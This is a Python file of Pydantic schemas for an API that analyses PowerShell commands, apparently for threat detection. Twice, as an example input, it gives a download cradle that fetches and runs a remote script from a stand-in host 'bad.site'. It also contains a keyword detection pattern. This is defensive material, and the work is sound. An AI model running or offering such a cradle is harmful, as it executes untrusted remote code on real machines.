"""
Pydantic models for request/response schemas
"""
from pydantic import BaseModel, Field, field_validator
from typing import Optional, List, Dict, Any
from datetime import datetime


class AnalyzeCommandRequest(BaseModel):
    """Schema for PowerShell command analysis request"""
    command: str = Field(..., description="PowerShell command to analyze", max_length=100000, example="IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")
    user_id: Optional[str] = Field(None, description="User ID (if authenticated)")
    ip_address: Optional[str] = Field(None, description="Client IP address")
    user_agent: Optional[str] = Field(None, description="User agent string")
    country: Optional[str] = Field(None, description="Country name")
    city: Optional[str] = Field(None, description="City name")
    region: Optional[str] = Field(None, description="Region/state name")
    timezone: Optional[str] = Field(None, description="Timezone")
    search_type: Optional[str] = Field(None, description="Search type (WEB/API)")
    session_id: Optional[str] = Field(None, description="Session ID")
    
    @field_validator('command')
    @classmethod
    def validate_command_length(cls, v):
        if not v or not isinstance(v, str):
            raise ValueError("Command is required and must be a string")
        if len(v) > 100000:
            raise ValueError(f"Command exceeds maximum length of 100000 characters. Provided: {len(v)} characters")
        if len(v) == 0:
            raise ValueError("Command cannot be empty")
        return v

    model_config = {
        "json_schema_extra": {
            "example": {
                "command": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')"
            }
        }
    }


class CreateUserSessionRequest(BaseModel):
    """Schema for user session creation"""
    user_id: str = Field(..., description="User ID from authentication")
    ip_address: Optional[str] = Field(None, description="Client IP address")
    user_agent: Optional[str] = Field(None, description="User agent string")
    country: Optional[str] = Field(None, description="Country name")





class UpdateProfileRequest(BaseModel):
    """Schema for profile update"""
    username: Optional[str] = Field(None, description="Username")
    full_name: Optional[str] = Field(None, description="Full name")
    avatar_url: Optional[str] = Field(None, description="Avatar URL")


class SignatureMatch(BaseModel):
    """Schema for signature match details"""
    pattern: str
    matched_text: str
    position: Dict[str, int]
    match_number: int


class DetectedSignature(BaseModel):
    """Schema for detected signature"""
    name: str
    description: str
    severity: str
    base_score: float
    matches_found: int
    total_score: float
    max_match_allowed: int
    matches_details: List[SignatureMatch]
    pattern: str
    tactics: List[str]
    techniques: List[str]
    reference: List[str]
    link: Optional[str] = None
    indicator_type: Optional[str] = "community"


class CacheInfo(BaseModel):
    """Schema for cache information"""
    cached: bool
    cache_age_minutes: float


class AnalysisResult(BaseModel):
    """Schema for analysis result"""
    command: str
    risk_score: float
    severity: str
    signatures_detected: List[DetectedSignature]
    tactics: List[str]
    techniques: List[str]
    total_signatures_checked: int
    detected_count: int
    cache_info: CacheInfo


class AnalyzeCommandResponse(BaseModel):
    """Schema for analysis response"""
    success: bool
    analysis: AnalysisResult
    analysis_id: Optional[str] = None
    session_id: Optional[str] = None
    
    model_config = {
        "json_schema_extra": {
            "example": {
                "success": True,
                "analysis": {
                    "command": "dump password reflection",
                    "risk_score": 12.0,
                    "severity": "critical",
                    "signatures_detected": [
                        {
                            "name": "Fairly suspicious keywords",
                            "description": "Detects suspicious PowerShell keywords",
                            "severity": "low",
                            "base_score": 4.0,
                            "matches_found": 3,
                            "total_score": 12.0,
                            "max_match_allowed": 1,
                            "matches_details": [
                                {
                                    "pattern": "(?i)password|dump|reflection",
                                    "matched_text": "dump",
                                    "position": {"start": 0, "end": 4},
                                    "match_number": 1
                                }
                            ],
                            "pattern": "(?i)password|dump|reflection",
                            "tactics": ["Execution"],
                            "techniques": ["T1059.001"],
                            "reference": ["https://github.com/SigmaHQ/sigma/..."],
                            "link": "https://github.com/avasero/psexposed/..."
                        }
                    ],
                    "tactics": ["Execution"],
                    "techniques": ["T1059.001"],
                    "total_signatures_checked": 7,
                    "detected_count": 1,
                    "cache_info": {
                        "cached": False,
                        "cache_age_minutes": 0.0
                    }
                },
                "analysis_id": "kcxlljo9",
                "session_id": "ac86218b-d91d-4396-85e0-50d42550d832"
            }
        }
    }


class ApiKeyData(BaseModel):
    """Schema for API Key data"""
    id: str
    api_key: str
    name: str
    created_at: datetime
    last_used_at: Optional[datetime] = None
    usage_count: int
    is_active: bool


class ApiKeyResponse(BaseModel):
    """Schema for API Key response"""
    success: bool
    api_key: Optional[ApiKeyData] = None
    message: Optional[str] = None


class UserProfile(BaseModel):
    """Schema for user profile"""
    id: str
    username: Optional[str] = None
    full_name: Optional[str] = None
    avatar_url: Optional[str] = None
    created_at: datetime
    updated_at: datetime


class UserProfileResponse(BaseModel):
    """Schema for user profile response"""
    success: bool
    profile: UserProfile
    user: Dict[str, Any]


class ErrorResponse(BaseModel):
    """Schema for error responses"""
    error: str
    detail: Optional[str] = None
    status_code: Optional[int] = None
    
    model_config = {
        "json_schema_extra": {
            "example": {
                "error": "Command is required and must be a string"
            }
        }
    }


class RateLimitResponse(BaseModel):
    """Schema for rate limit response"""
    error: Dict[str, Any]
    rate_limit_info: Dict[str, Any]
    session_id: str
    
    model_config = {
        "json_schema_extra": {
            "example": {
                "error": {
                    "code": "QuotaExceededError",
                    "message": "You have exceeded your quota (per minute evaluation limit). Please wait a while."                },
                "rate_limit_info": {
                    "current_count": 11,
                    "limit": 10,
                    "window_seconds": 3600,
                    "seconds_until_reset": 3599
                },
                "session_id": "session-uuid"
            }
        }
    }


class PaginationParams(BaseModel):
    """Pagination parameters for list endpoints"""
    limit: Optional[int] = Field(
        None, 
        ge=1, 
        le=100,
        description="Number of records to return. Max 100. If not specified, returns all records."
    )
    offset: Optional[int] = Field(
        0,
        ge=0,
        description="Pagination offset. Use with limit for page-based pagination."
    )
    short_id: Optional[str] = Field(
        None,
        description="Filter by specific analysis short_id (8-character identifier)"
    )


class CommandEvaluationResponse(BaseModel):
    """Single command evaluation record"""
    id: int
    uuid: str
    short_id: str
    command: str
    risk_score: float
    severity: str
    signatures_detected: List[Dict[str, Any]]
    cmdlets_detected: List[Dict[str, Any]]
    tactics: List[str]
    techniques: List[str]
    created_at: str
    search_type: str
    ip_country: Optional[str] = None
    ip_city: Optional[str] = None


class UserCommandEvaluationsResponse(BaseModel):
    """Response for user command evaluations list"""
    success: bool
    user_id: str
    auth_type: str = Field(description="Authentication type: 'jwt' for web or 'api_key' for API")
    total_returned: int = Field(description="Number of records returned in this response")
    pagination: Dict[str, Any] = Field(
        description="Pagination info: limit, offset, and has_more flag"
    )
    analyses: List[CommandEvaluationResponse]
    message: Optional[str] = None


class ReviewRequestCreate(BaseModel):
    """Schema for creating a review request"""
    command: str = Field(..., description="The PowerShell command being reviewed", max_length=100000)
    reason: str = Field(..., description="Reason for the review request: 'unmatched' or 'incorrectly_matched'")
    comment: Optional[str] = Field(None, description="Additional comments or details about the review request", max_length=2000)

    @field_validator('reason')
    @classmethod
    def validate_reason(cls, v):
        allowed_reasons = ['unmatched', 'incorrectly_matched']
        if v not in allowed_reasons:
            raise ValueError(f"Reason must be one of: {', '.join(allowed_reasons)}")
        return v


class ReviewRequestResponse(BaseModel):
    """Schema for review request response"""
    success: bool
    message: str
    review_id: Optional[str] = None
